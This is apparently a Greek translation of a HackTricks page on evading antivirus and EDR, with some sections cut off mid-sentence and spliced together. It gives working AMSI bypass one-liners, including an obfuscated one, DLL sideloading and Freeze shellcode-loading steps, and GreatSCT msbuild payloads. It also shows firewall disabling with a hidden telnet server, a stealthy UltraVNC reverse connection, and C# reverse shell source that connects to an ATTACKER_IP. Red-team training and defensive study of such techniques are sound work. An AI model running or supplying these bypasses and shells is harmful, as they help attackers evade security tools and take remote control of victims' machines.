# Αποφυγή Αντιικών (AV) 

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Ειδικός Ερυθρού Συνεργείου AWS του HackTricks)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε** στην 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα τηλεγραφήματος**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs** στα [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

**Αυτή η σελίδα έγραψε από** [**@m2rc\_p**](https://twitter.com/m2rc\_p)**!**

## **Μεθοδολογία Αποφυγής Αντιικών (AV)**

Προς το παρόν, τα AV χρησιμοποιούν διαφορετικές μεθόδους για τον έλεγχο εάν ένα αρχείο είναι κακόβουλο ή όχι, στατική ανίχνευση, δυναμική ανάλυση και για τα πιο προηγμένα EDRs, αναλυτική ανάλυση.

### **Στατική ανίχνευση**

Η στατική ανίχνευση επιτυγχάνεται με το να σημαίνει γνωστές κακόβουλες συμβολοσειρές ή πίνακες bytes σε ένα δυαδικό αρχείο ή σενάριο, και επίσης εξάγοντας πληροφορίες από το ίδιο το αρχείο (π.χ. περιγραφή αρχείου, όνομα εταιρείας, ψηφιακές υπογραφές, εικονίδιο, checksum, κλπ.). Αυτό σημαίνει ότι χρησιμοποιώντας γνωστά δημόσια εργαλεία μπορεί να σας πιάσουν πιο εύκολα, καθώς πιθανόν έχουν αναλυθεί και έχουν σημανθεί ως κακόβουλα. Υπάρχουν μερικοί τρόποι για να παρακάμψετε αυτού του είδους την ανίχνευση:

* **Κρυπτογράφηση**

Εάν κρυπτογραφήσετε το δυαδικό, δεν θα υπάρχει τρόπος για το AV να ανιχνεύσει το πρόγραμμά σας, αλλά θα χρειαστείτε κάποιο είδος φορτωτή για να αποκρυπτογραφήσετε και να εκτελέσετε το πρόγραμμα στη μνήμη.

* **Απόκρυψη**

Μερικές φορές ό,τι χρειάζεστε να κάνετε είναι να αλλάξετε μερικές συμβολοσειρές στο δυαδικό σας ή στο σενάριό σας για να το περάσετε από το AV, αλλά αυτό μπορεί να είναι μια χρονοβόρα εργασία ανάλογα με το τι προσπαθείτε να αποκρύψετε.

* **Προσαρμοσμένα εργαλεία**

Εάν αναπτύξετε τα δικά σας εργαλεία, δεν θα υπάρχουν γνωστές κακές υπογραφές, αλλά αυτό απαιτεί πολύ χρόνο και προσπάθεια.

{% hint style="info" %}
Ένας καλός τρόπος για έλεγχο ενάντια στη στατική ανίχνευση του Windows Defender είναι το [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Βασικά χωρίζει το αρχείο σε πολλά τμήματα και στη συνέχεια ζητά από το Defender να σαρώσει κάθε ένα ξεχωριστά, με αυτόν τον τρόπο, μπορεί να σας πει ακριβώς ποιες είναι οι σημαινόμενες συμβολοσειρές ή bytes στο δυαδικό σας.
{% endhint %}

Συνιστώ ιδιαίτερα να ελέγξετε αυτήν την [λίστα αναπαραγωγής στο YouTube](https://www.youtube.com/playlist?list=PLj05gPj8rk\_pkb12mDe4PgYZ5qPxhGKGf) για πρακτική Αποφυγή Αντιικών.

### **Δυναμική ανάλυση**

Η δυναμική ανάλυση είναι όταν το AV εκτελεί το δυαδικό σας σε ένα αμμουδιάκι και παρακολουθεί για κακόβουλη δραστηριότητα (π.χ. προσπαθεί να αποκρυπτογραφήσει και να διαβάσει τους κωδικούς πρόσβασης του περιηγητή σας, να εκτελέσει ένα minidump στο LSASS, κλπ.). Αυτό το μέρος μπορεί να είναι λίγο πιο δύσκολο να δουλέψει, αλλά εδώ είναι μερικά πράγματα που μπορείτε να κάνετε για να αποφύγετε τα αμμουδιάκια.

* **Υπνος πριν την εκτέλεση** Ανάλογα με το πώς υλοποιείται, μπορεί να είναι ένας μεγάλος τρόπος παράκαμψης της δυναμικής ανάλυσης του AV. Τα AV έχουν πολύ λίγο χρόνο για να σαρώσουν αρχεία ώστε να μην διακόψουν τη ροή εργασίας του χρήστη, οπότε η χρήση μεγάλων χρονικών διαστημάτων ύπνου μπορεί να διαταράξει την ανάλυση των δυαδικών. Το πρόβλημα είναι ότι πολλά αμμουδιάκια των AV μπορεί απλά να παραλείψουν τον ύπνο ανάλογα με το πώς υλοποιείται.
* **Έλεγχος πόρων του υπολογιστή** Συνήθως τα Αμμουδιάκια έχουν πολύ λίγους πόρους για να δουλέψουν (π.χ. < 2GB RAM), διαφορετικά θα μπορούσαν να επιβραδύνουν τον υπολογιστή του χρήστη. Μπορείτε επίσης να γίνετε πολύ δημιουργικοί εδώ, για παράδειγμα ελέγχοντας τη θερμοκρασία της CPU ή ακόμη και τις ταχύτητες του ανεμιστήρα, όχι όλα θα είναι υλοποιημένα στο αμμουδιάκι.
* **Έλεγχοι συγκεκριμένου υπολογιστή** Εάν θέλετε να στοχεύσετε ένα χρήστη του οποίου ο υπολογιστής είναι ενταγμένος στον τομέα "contoso.local", μπορείτε να ελέγξετε τον τομέα του υπολογιστή για να δείτε αν ταιριάζει με αυτόν που έχετε καθορίσει, αν δεν ταιριάζει, μπορείτε να κάνετε το πρόγραμμά σας να τερματίσει.

Αποδεικνύεται ότι το όνομα υπολογιστή του Microsoft Defender Sandbox είναι HAL9TH, οπότε, μπορείτε να ελέγξετε το όνομα του υπολογιστή στο malware σας πριν την εκρηξη, αν το όνομα ταιριάζει με το HAL9TH, σημαίνει ότι βρίσκεστε μέσα στο αμμουδιάκι του Defender, οπότε μπορείτε να κάνετε το πρόγραμμά σας να τερματίσει.

<figure><img src="../.gitbook/assets/image (3) (6).png" alt=""><figcaption><p>πηγή: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Μερικές άλλες πολύ καλές συμβουλές από τον [@mgeeky](https://twitter.com/mariuszbit) για την αντιμετώπιση των Αμμουδιάκιων

<figure><img src="../.gitbook/assets/image (2) (1) (1) (2) (1).png" alt=""><figcaption><p><a href="https://
## DLL Sideloading & Proxying

**Το DLL Sideloading** εκμεταλλεύεται τη σειρά αναζήτησης DLL που χρησιμοποιείται από τον φορτωτή τοποθετώντας την εφαρμογή θύμα και τα κακόβουλα φορτία δίπλα-δίπλα.

Μπορείτε να ελέγξετε για προγράμματα ευάλωτα στο DLL Sideloading χρησιμοποιώντας το [Siofra](https://github.com/Cybereason/siofra) και το ακόλουθο script powershell:

{% code overflow="wrap" %}
```powershell
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
{% endcode %}

Αυτή η εντολή θα εμφανίσει τη λίστα των προγραμμάτων που είναι ευάλωτα στην DLL hijacking μέσα στο "C:\Program Files\\" και τα αρχεία DLL που προσπαθούν να φορτώσουν.

Συνιστώ ανεπιφύλακτα να **εξερευνήσετε μόνοι σας τα προγράμματα που είναι ευάλωτα στην DLL Hijacking/Sideloadable**, αυτή η τεχνική είναι αρκετά αόρατη όταν γίνεται σωστά, αλλά αν χρησιμοποιήσετε γνωστά δημόσια προγράμματα DLL Sideloadable, μπορεί να σας πιάσουν εύκολα.

Απλά τοποθετώντας μια κακόβουλη DLL με το όνομα που ένα πρόγραμμα περιμένει να φορτώσει, δεν θα φορτώσει το φορτίο σας, καθώς το πρόγραμμα περιμένει κάποιες συγκεκριμένες λειτουργίες μέσα σε αυτή τη DLL. Για να διορθώσουμε αυτό το θέμα, θα χρησιμοποιήσουμε μια άλλη τεχνική που ονομάζεται **DLL Proxying/Forwarding**.

Το **DLL Proxying** προωθεί τις κλήσεις που ένα πρόγραμμα κάνει από την προξενική (και κακόβουλη) DLL στην αρχική DLL, διατηρώντας έτσι τη λειτουργικότητα του προγράμματος και είναι σε θέση να χειριστεί την εκτέλεση του φορτίου σας.

Θα χρησιμοποιήσω το έργο [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) από τον [@flangvik](https://twitter.com/Flangvik/)

Αυτά είναι τα βήματα που ακολούθησα:

{% code overflow="wrap" %}
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
{% endcode %}

Η τελευταία εντολή θα μας δώσει 2 αρχεία: ένα πρότυπο κώδικα πηγής DLL και το αρχικό μετονομασμένο DLL.

<figure><img src="../.gitbook/assets/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
{% endcode %}

Αυτά είναι τα αποτελέσματα:

<figure><img src="../.gitbook/assets/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Και το shellcode μας (κωδικοποιημένο με [SGN](https://github.com/EgeBalci/sgn)) και η proxy DLL έχουν ποσοστό ανίχνευσης 0/26 στο [antiscan.me](https://antiscan.me)! Θα το θεωρούσα επιτυχία.

<figure><img src="../.gitbook/assets/image (11) (3).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Σας **συνιστώ ανεπιφύλακτα** να παρακολουθήσετε το [VOD του twitch του S3cur3Th1sSh1t](https://www.twitch.tv/videos/1644171543) σχετικά με το DLL Sideloading καθώς και το [βίντεο του ippsec](https://www.youtube.com/watch?v=3eROsG\_WNpE) για να μάθετε περισσότερα για ό,τι συζητήσαμε με πιο λεπτομερή τρόπο.
{% endhint %}

## [**Freeze**](https://github.com/optiv/Freeze)

`Το Freeze είναι ένα εργαλείο εκτέλεσης φορτίου για την αποφυγή των EDRs χρησιμοποιώντας ανασταλμένες διεργασίες, άμεσες κλήσεις συστήματος και εναλλακτικές μεθόδους εκτέλεσης`

Μπορείτε να χρησιμοποιήσετε το Freeze για να φορτώσετε και να εκτελέσετε το shellcode σας με έναν διακριτικό τρόπο.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../.gitbook/assets/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Η αποφυγή είναι απλά ένα παιχνίδι γάτας & ποντικιού, αυτό που λειτουργεί σήμερα μπορεί να ανιχνευθεί αύριο, οπότε μην βασίζεστε μόνο σε ένα εργαλείο, αν είναι δυνατόν, δοκιμάστε να συνδέσετε πολλές τεχνικές αποφυγής.
{% endhint %}

## AMSI (Διεπαφή Σάρωσης Αντι-Κακόβουλου Λογισμικού)

Το AMSI δημιουργήθηκε για να αποτρέψει το "[κακόβουλο λογισμικό χωρίς αρχεία](https://en.wikipedia.org/wiki/Fileless\_malware)". Αρχικά, τα Αντι-Κακόβουλα ήταν ικανά μόνο να σαρώνουν **αρχεία στο δίσκο**, οπότε αν μπορούσατε κάπως να εκτελέσετε φορτία **απευθείας στη μνήμη**, το Αντι-Κακόβουλο δεν θα μπορούσε να κάνει τίποτα για να το εμποδίσει, καθώς δεν είχε αρκετή ορατότητα.

Το χαρακτηριστικό AMSI ενσωματώνεται σε αυτά τα στοιχεία των Windows.

* Έλεγχος Λογαριασμού Χρήστη, ή UAC (ανύψωση των EXE, COM, MSI, ή εγκατάσταση ActiveX)
* PowerShell (σενάρια, διαδραστική χρήση, και δυναμική αξιολόγηση κώδικα)
* Χώρος Εκτέλεσης Σεναρίων των Windows (wscript.exe και cscript.exe)
* JavaScript και VBScript
* Μακροεντολές του Office VBA

Επιτρέπει στις λύσεις αντιιών να επιθεωρούν τη συμπεριφορά του σεναρίου αποκαλύπτοντας το περιεχόμενο του σεναρίου με μια μορφή που δεν είναι ούτε κρυπτογραφημένη ούτε αποκωδικοποιημένη.

Η εκτέλεση της εντολής `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` θα παράγει την ακόλουθη ειδοποίηση στον Windows Defender.

<figure><img src="../.gitbook/assets/image (4) (5).png" alt=""><figcaption></figcaption></figure>

Παρατηρήστε πως προσθέτει προτού το `amsi:` και στη συνέχεια τη διαδρομή προς το εκτελέσιμο από το οποίο τρέχει το σενάριο, σε αυτήν την περίπτωση το powershell.exe

Δεν αποθηκεύσαμε κανένα αρχείο στο δίσκο, αλλά παρ' όλα αυτά εντοπιστήκαμε στη μνήμη λόγω του AMSI.

Υπάρχουν μερικοί τρόποι να παρακάμψετε το AMSI:

* **Απόκρυψη**

Καθώς το AMSI λειτουργεί κυρίως με στατικές ανιχνεύσεις, άρα, η τροποποίηση των σεναρίων που προσπαθείτε να φορτώσετε μπορεί να είναι ένας καλός τρόπος για την αποφυγή της ανίχνευσης.

Ωστόσο, το AMSI έχει τη δυνατότητα να αποκρυπτογραφήσει σενάρια ακόμη κι αν έχουν πολλαπλά επίπεδα, οπότε η απόκρυψη θα μπορούσε να είναι μια κακή επιλογή ανάλογα με το πώς γίνεται. Αυτό το καθιστά μην τόσο απλό να το αποφύγετε. Ωστόσο, μερικές φορές, ό,τι χρειάζεται είναι να αλλάξετε μερικά ονόματα μεταβλητών και θα είστε εντάξει, οπότε εξαρτάται από το πόσο κάτι έχει σημανθεί.

* **Παράκαμψη AMSI**

Καθώς το AMSI εφαρμόζεται με το φόρτωμα ενός DLL στη διαδικασία powershell (επίσης cscript.exe, wscript.exe, κλπ.), είναι δυνατό να το παραβιάσετε εύκολα ακόμη και τρέχοντας ως μη προνομιούχος χρήστης. Λόγω αυτής της ελλάτωσης στην υλοποίηση του AMSI, οι ερευνητές έχουν βρει πολλούς τρόπους για να παρακάμψουν τη σάρωση του AMSI.

**Επιβολή Σφάλματος**

Η επιβολή της αρχικοποίησης του AMSI να αποτύχει (amsiInitFailed) θα οδηγήσει στο ότι δεν θα ξεκινήσει καμία σάρωση για την τρέχουσα διαδικασία. Αρχικά αυτό αποκαλύφθηκε από τον [Matt Graeber](https://twitter.com/mattifestation) και η Microsoft έχει αναπτύξει μια υπογραφή για να αποτρέψει την ευρύτερη χρήση.
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
{% endcode %}

Αρκούσε μια γραμμή κώδικα powershell για να καταστήσει το AMSI αχρηστο για την τρέχουσα διαδικασία powershell. Αυτή η γραμμή φυσικά έχει επισημανθεί από το AMSI ίδιο, οπότε απαιτείται κάποια τροποποίηση για να χρησιμοποιηθεί αυτή η τεχνική.

Εδώ υπάρχει μια τροποποιημένη παράκαμψη AMSI που πήρα από αυτό το [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```powershell
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
**Επέμβαση στη Μνήμη**

Αυτή η τεχνική ανακαλύφθηκε αρχικά από τον [@RastaMouse](https://twitter.com/\_RastaMouse/) και περιλαμβάνει την εύρεση της διεύθυνσης για τη λειτουργία "AmsiScanBuffer" στο αρχείο amsi.dll (υπεύθυνη για τη σάρωση της εισόδου που παρέχει ο χρήστης) και την αντικατάστασή της με οδηγίες για επιστροφή του κώδικα για το E\_INVALIDARG, με αυτόν τον τρόπο, το αποτέλεσμα της πραγματικής σάρωσης θα επιστρέψει 0, το οποίο ερμηνεύεται ως ένα καθαρό αποτέλεσμα.

{% hint style="info" %}
Παρακαλώ διαβάστε [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) για μια πιο λεπτομερή εξήγηση.
{% endhint %}

Υπάρχουν επίσης πολλές άλλες τεχνικές που χρησιμοποιούνται για την παράκαμψη του AMSI με το Powershell, ελέγξτε [**αυτήν τη σελίδα**](basic-powershell-for-pentesters/#amsi-bypass) και [αυτό το αποθετήριο](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) για να μάθετε περισσότερα σχετικά με αυτές.

Ή αυτό το σενάριο που μέσω επέμβασης στη μνήμη θα επεξεργαστεί κάθε νέο Powersh

## Απόκρυψη

Υπάρχουν αρκετά εργαλεία που μπορούν να χρησιμοποιηθούν για την **απόκρυψη κ
```powershell
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Εδώ υπάρχει ένα δείγμα για την αποφυγή του SmartScreen με τη συσκευασία φορτίων μέσα σε αρχεία ISO χρησιμοποιώντας το [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../.gitbook/assets/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## Αντανάκλαση Συναρμολόγησης C#

Η φόρτωση δυαδικών αρχείων C# στη μνήμη είναι γνωστή εδώ και καιρό και εξακολουθεί να είναι ένας πολύ καλός τρόπος για την εκτέλεση των εργαλείων μετά-εκμετάλλευσης σας χωρίς να εντοπιστεί από το Αντιιικό Λογισμικό (AV).

Καθώς το φορτίο θα φορτωθεί απευθείας στη μνήμη χωρίς να αγγίξει το δίσκο, θα πρέπει να ανησυχούμε μόνο για το patching του AMSI για ολόκληρη τη διαδικασία.

Τα περισσότερα πλαισία C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc, κ.λπ.) παρέχουν ήδη τη δυνατότητα εκτέλεσης δυαδικών αρχείων C# απευθείας στη μνήμη, αλλά υπάρχουν διαφορετικοί τρόποι για να το κάνετε:

* **Ανακλάστε & Εκτελέστε**

Περιλαμβάνει **τη δημιουργία ενός νέου διερευνητικού διεργασίας**, ενσωματώστε το κακόβουλο κώδικα μετά-εκμετάλλευσης σας σε αυτήν τη νέα διεργασία, εκτελέστε τον κακόβουλο κώδικα σας και όταν τελειώσετε, σκοτώστε τη νέα διεργασία. Αυτό έχει τα πλεονεκτήματά του και τα μειονεκτήματά του. Το πλεονέκτημα της μεθόδου ανακλάστε και εκτελέστε είναι ότι η εκτέλεση συμβαίνει **έξω** από τη διαδικασία εμφυτεύματος Beacon μας. Αυτό σημαίνει ότι αν κάτι στη δράση μετά-εκμετάλλευσής μας πάει στραβά ή εντοπίζεται, υπάρχει **πολύ μεγαλύτερη πιθανότητα** να επιβιώσει το **εμφύτευμά μας.** Το μειονέκτημα είναι ότι έχετε **μεγαλύτερη πιθανότητα** να εντοπιστείτε από **Συμπεριφορικές Ανιχνεύσεις**.

<figure><img src="../.gitbook/assets/image (7) (1) (3).png" alt=""><figcaption></figcaption></figure>

* **Ενσωμάτωση**

Πρόκειται για την ενσωμάτωση του κακόβουλου κώδικα μετά-εκμετάλλευσης **στη δική του διεργασία**. Με αυτόν τον τρόπο, μπορείτε να αποφύγετε τη δημιουργία μιας νέας διεργασίας και την εντοπισμό της από το Αντιιικό Λογισμικό, αλλά το μειονέκτημα είναι ότι αν κάτι πάει στραβά με την εκτέλεση του φορτίου σας, υπάρχει **πολύ μεγαλύτερη πιθανότητα** να **χάσετε το εμφύτευμά σας** καθώς ενδέχεται να καταρρεύσει.

<figure><img src="../.gitbook/assets/image (9) (3) (1).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Αν θέλετε να διαβάσετε περισσότερα για τη φόρτωση Δυαδικών Αρχείων C#, παρακαλώ ελέγξτε αυτό το άρθρο [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) και το InlineExecute-Assembly BOF τους ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))
{% endhint %}

Μπορείτε επίσης να φορτώσετε Δυαδικά Αρχεία C# **από το PowerShell**, ελέγξτε το [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) και το βίντεο του [S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Χρήση Άλλων Γλωσσών Προγραμματισμού

Όπως προτάθηκε στο [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), είναι δυνατόν να εκτελέσετε κακόβουλο κώδικα χρησιμοποιώντας άλλες γλώσσες δίνοντας στη μηχανή που έχει υποστεί επίθεση πρόσβαση **στο περιβάλλον ερμηνευτή που έχει εγκατασταθεί στον Ελεγχόμενο από τον Επιτιθέμενο SMB μοιρασμένο φάκελο**.&#x20;

Επιτρέποντας την πρόσβαση στα Δυαδικά Αρχεία Ερμηνευτή και το περιβάλλον στον SMB μοιρασμένο φάκελο μπορείτε **να εκτελέσετε αυθαίρετο κώδικα σε αυτές τις γλώσσες μέσα στη μνήμη** της μηχανής που έχει υποστεί επίθεση.

Το αποθετήριο υποδεικνύει: Το Defender εξακολουθεί να σαρώνει τα σενάρια, αλλά χρησιμοποιώντας Go, Java, PHP κ.λπ. έχουμε **μεγαλύτερη ευελιξία για την απόκρυψη στατικών υπογραφών**. Ο έλεγχος με τυχαία μη-εμποδισμένα σενάρια αντιστροφής κέλυφους σε αυτές τις γλώσσες έχει αποδειχθεί επιτυχής.

## Προηγμένη Αποφυγή

Η αποφυγή είναι ένα πολύπλοκο θέμα, μερικές φορές πρέπει να λάβετε υπόψη πολλές διαφορετικές πηγές τηλεμετρίας σε ένα σύστημα μόνο, οπότε είναι σχεδόν αδύνατο να παραμείνετε εντελώς ανεντοπίστους σε ώριμα περιβάλλοντα.

Κάθε περιβάλλον που αντιμετωπίζετε θα έχει τα δικά του πλεονεκτήματα και μειονεκτήματα.

Σας προτρέπω ιδιαίτερα να παρακολουθήσετε αυτήν την ομιλία από [@ATTL4S](https://twitter.com/DaniLJ94), για να μπείτε σε περισσότερες προηγμένες τεχνικές αποφυγής.

{% embed url="https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo" %}

Αυτή είναι επίσης μια άλλη εξαιρετική ομιλία από [@mariuszbit](https://twitter.com/mariuszbit) σχετικά με την Αποφυγή σε Βάθος.

{% embed url="https://www.youtube.com/watch?v=IbA7Ung39o4" %}

## **Παλιές Τεχνικές**

### **Ελέγξτε ποια μέρη εντοπίζει το Defender ως κακόβουλα**

Μπορείτε να χρησιμοποιήσετε το [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) το οποίο θα **αφαιρέσει μέρη του δυαδικού αρχείου** μέχρι να **ανακαλύψει ποιο μέρος εντοπίζει ο Defender** ως κακόβουλο και θα το χωρίσει σε εσάς.\
Ένα άλλο εργαλείο που κάνει το **ίδιο πράγμα είναι** το [**avred**](https://github.com/dobin/avred) με μια ανοικτή προσφορά υπηρεσίας στη διεύθυνση [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Κάντε το **ξεκίνημα** όταν εκκινείται το σύστημα και **εκτελέστε** το τώρα:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Αλλαγή θύρας telnet** (stealth) και απενεργοποίηση του τοίχου προστασίας:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Κατεβάστε το από: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (θέλετε τις bin λήψεις, όχι την εγκατάσταση)

**ΣΤΟΝ ΥΠΟΛΟΓΙΣΤΗ ΠΡΟΟΡΙΣΜΟΥ**: Εκτελέστε το _**winvnc.exe**_ και ρυθμίστε τον διακομιστή:

* Ενεργοποιήστε την επιλογή _Απενεργοποίηση εικονιδίου διαμορφωτή_
* Ορίστε έναν κωδικό στο _Κωδικός VNC_
* Ορίστε έναν κωδικό στο _Κωδικός Μόνο για προβολή_

Στη συνέχεια, μετακινήστε το δυαδικό _**winvnc.exe**_ και το **νεοδημιουργημένο** αρχείο _**UltraVNC.ini**_ μέσα στο **θύμα**

#### **Αντίστροφη σύνδεση**

Ο **επιτιθέμενος** πρέπει να **εκτελέσει μέσα** στον **δικό του υπολογιστή** το δυαδικό `vncviewer.exe -listen 5900` έτσι ώστε να είναι **έτοιμος** να πιάσει μια αντίστροφη **σύνδεση VNC**. Στη συνέχεια, μέσα στο **θύμα**: Ξεκινήστε τον δαίμονα winvnc `winvnc.exe -run` και εκτελέστε `winvnc.exe [-autoreconnect] -connect <διεύθυνση_επιτιθέμενου>::5900`

**ΠΡΟΕΙΔΟΠΟΙΗΣΗ:** Για να διατηρήσετε την αόρατη λειτουργία πρέπει να μην κάνετε μερικά πράγματα

* Μην ξεκινήσετε το `winvnc` αν είναι ήδη ενεργό ή θα ενεργοποιήσετε ένα [αναδυόμενο παράθυρο](https://i.imgur.com/1SROTTl.png). ελέγξτε αν εκτελείται με `tasklist | findstr winvnc`
* Μην ξεκινήσετε το `winvnc` χωρίς το `UltraVNC.ini` στον ίδιο φάκελο ή θα προκαλέσετε το [παράθυρο διαμόρφωσης](https://i.imgur.com/rfMQWcf.png) να ανοίξει
* Μην τρέξετε το `winvnc -h` για βοήθεια ή θα ενεργοποιήσετε ένα [αναδυόμενο παράθυρο](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Κατεβάστε το από: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Μέσα στο GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Τώρα **ξεκινήστε τον ακροατή** με `msfconsole -r file.rc` και **εκτελέστε** το **φορτίο xml** με:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Ο τρέχων ανιχνευτής θα τερματίσει τη διαδικασία πολύ γρήγορα.**

### Συντάσσοντας το δικό μας αντίστροφο κέλυφος

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Πρώτο C# Αντίστροφο Κέλυφος

Συντάξτε το με:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Χρησιμοποιήστε το με:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
